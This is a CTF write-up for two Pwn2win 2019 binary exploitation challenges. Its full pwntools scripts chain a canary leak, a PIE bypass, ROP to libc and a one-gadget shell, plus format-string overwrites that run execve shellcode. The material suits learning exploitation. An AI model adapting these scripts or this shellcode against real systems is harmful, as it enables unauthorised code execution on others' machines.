# Pwn2win 2019 CTF
## Exploitation
### FULL tROLL (223 points, dynamic)
First, you can open /proc/self/maps to defeat PIE.

There is a buffer overflow vulnerbility when the program asks for you to enter a password.

Because it will print `"Unable to open %s file"` when the file name is invalid, so you can abuse this to leak the stack canary.

After leaking the canary, you can preform a ROP attack to leak libc address using gadgets combined with `puts.plt`, then return back to main again.

**Get shell attempts**
1. (Failed) I tried to use pwntools's DynELF to retrive the libc base, but it requires a lot of ROP attempts to leak the address, but since the program uses `getenv()`, it would cause a segfault because the ROP stack frame overlaps with the environment pointers on the stack.

2. (Success) Use libc-database to find the apporiate offsets, and use onegadget with ROP to get shell.

```python
from pwn import *                                                                                                                                                                                    [11/6066]
#context.log_level = 'DEBUG'             
context.terminal = ['tmux', 'splitw', '-h']
password = 'VibEv7xCXyK8AjPPRjwtp9X'       
#p = process('./full_troll', env={'LD_PRELOAD':'./libc-2.27.so'})
p = remote('200.136.252.31', 2222)
libc = ELF('./libc-2.27.so')                                                                           
elf = ELF('./full_troll')
def debug(bps=[]): 
    cmd = ''   
    cmd+=''.join(['b *$rebase({:#x})\n'.format(b) for b in bps])
    cmd += 'c'
    gdb.attach(p, cmd)           
    pause()


'''
Leak canary
'''
p.recvline()
payload = password + 'A'*(0x20-23) + '\xee'*0x28 + '\xee'
p.sendline(payload)
leak = p.recvline()
canary = '\x00' + leak[leak.find('open ')+5+0x29:leak.find('open ')+5+0x29+7]
print len(canary)

'''
Leak elf base
'''
p.recvline()
payload = password + 'A'*(0x20-23) + '/proc/self/maps\x00'
p.sendline(payload)
leak = p.recvline()
elf_base = int(leak[:leak.find('-')],16)
log.info('elf base ' + hex(elf_base))

main_addr = 0xead + elf_base
puts_addr = elf.plt['puts'] + elf_base
poprdi= 0x10a3 + elf_base 
ret = 0x80e + elf_base
addrsp = 0xde6 + elf_base

payload = password + '\x00'*(0x20-23) + '\x00'*0x28 + canary + 'A'*0x8 + p64(poprdi)+p64(elf_base+elf.got['malloc']) + p64(puts_addr) + p64(main_addr)
p.sendline(payload)
p.recvuntil('error')
libc_base = u64(p.recv(6).ljust(8,'\x00'))-libc.symbols['malloc']
log.info('libc addr : ' + hex(libc_base))
shell = 0x001b3e9a + libc_base
system = libc_base + libc.symbols['system']
log.info(hex(system))

payload = password + '\x00'*(0x20-23) + '\x00'*0x28 + canary + 'A'*0x8 + p64(libc_base+0x4f2c5)
bps = [0x103C]
p.sendline(payload)
p.interactive()
```


### Random vault (303 points, dynamic)
There is a format string vulnerability when the program prints your name, but we can only preform two different attacks with it since you can only change the name once.

There is a range of memory that has RWX permission via `mprotect`, a function pointer, and a seed for `rand()` which returns indexes for the stored secrets.

**PLAN**
1. Use the first format string vul to leak program base and defeat PIE
2. Use the second format string vul to partial overwrite the last two bytes of the function pointer to point to the exectuable memory, and overwrite the seed to a value we know
3. Write the shellcode by storing secrets, and get shell.

Because the indexes are sparse even if we know the values initally, so I wrote a simple script to find a seed value that will give me four consecutive indexes, that is, 36 bytes of shellcode space
```python
from ctypes import cdll
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
for i in range(0,100000):
    libc.srand(i)
    l = list()
    for _ in range(7):
        r = libc.rand()
        index = (((r >> 56)+r) & 0xff) + (((r>>31)&0xffffffff)>>24)
        l.append(index)
    s = set(l)
    if len(s) < 7:
        # has duplicates
        continue
    sortedl = sorted(l)
    for j in range(0, 3):
        sublist = sortedl[j:j+4]
        compared = [k for k in range(sublist[0], sublist[0]+4)]
        if sublist == compared:
            print l
            print 'seed ' + str(i)
            exit()
```

The 7 indexes are `[12, 215, 164, 11, 64, 9, 10]` and the seed value is 56536.
Because my shellcode is 27 bytes, pad it to 32 bytes using `nop`.

The final exp script:
```python
from pwn import *                                                                                                                                                                                    [55/6203]
#context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']        
p = process('./random_vault')              
                                                                                                       
def find_addr():
    for i in range(1,40):    
        p = process('./random_vault')
        p.recvuntil('Username: ')                                                                      
        payload = 'B'*8+'%{}$016llx'.format(str(i)) 
        p.sendline(payload)
        p.recvuntil('Hello, ')            
        leak = p.recvline()
        if leak[12] =='5':
            log.critical(payload)
            log.critical(leak)
            pause() 
        #log.info(leak)
        p.close()

def debug(bps=[]):
   cmd = ''
   cmd+=''.join(['b *$rebase({:#x})\n'.format(b) for b in bps])
   cmd += 'c'
   gdb.attach(p, cmd)
   pause()


elf_offset = 0x1110
payload = 'BBBBBBBB%8$016llx'
p.recvuntil('Username: ')
p.sendline(payload)
p.recvuntil('Hello, ')
elf_base = int(p.recvline()[8:8+16],16) - elf_offset
log.info('ELF base : ' + hex(elf_base))

target = elf_base + 0x5000
seed = elf_base + 0x5008
seed_value = 56536 #[12, 215, 164, 11, 64, 9, 10]
vault = elf_base + 0x5010
target_value = (vault + 8*9) & 0xffff
print hex(target)

print 'target value, seed_value : ' + str(target_value) + ' ' + str(seed_value)
if target_value > seed_value:
    log.critical('target value greater than seed value, try again')
    exit()
                                                                                                                                                                                                                  
'''
Build format string payload
'''
payload = '%{}c%^^$hn'.format(target_value)                                                                                                                                                                   
payload += '%{}c%**$lln'.format(seed_value-target_value)                                                                                                                                                      
                                                                                                                                                                                                              
leftover = len(payload) % 0x8                                                                                                                                                                                 
if leftover != 0:
    payload = payload.ljust(8*(len(payload)/8+1), 'A')

k = len(payload)/8
payload = payload.replace('^^', str(24+k))
payload = payload.replace('**', str(25+k))
payload += p64(target)
payload += p64(seed)
log.info(payload)
print len(payload)
p.recv()
p.sendline(str(1))
p.recvuntil('Username: ')
p.sendline(payload)

shellcode = '\x31\xC0\x90\x90\x90\x90\x90\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x99\x52\x57\x54\x5E\xB0\x3B\x0F\x05'
print len(shellcode)
s1, s2, s3, s4 = [u64(shellcode[i:i+8]) for i in range(0, len(shellcode), 8)]

p.recv()
p.sendline(str(2)) #store secret
p.recvuntil('#1: ')
p.sendline(str(s4))

p.recvuntil('#2: ')
p.sendline(str(2))

p.recvuntil('#3: ')
p.sendline(str(2))

p.recvuntil('#4: ')
p.sendline(str(s3))

p.recvuntil('#5: ')
p.sendline(str(2))

p.recvuntil('#6: ')
p.sendline(str(s1))

p.recvuntil('#7: ')
p.sendline(str(s2))
p.interactive()
```

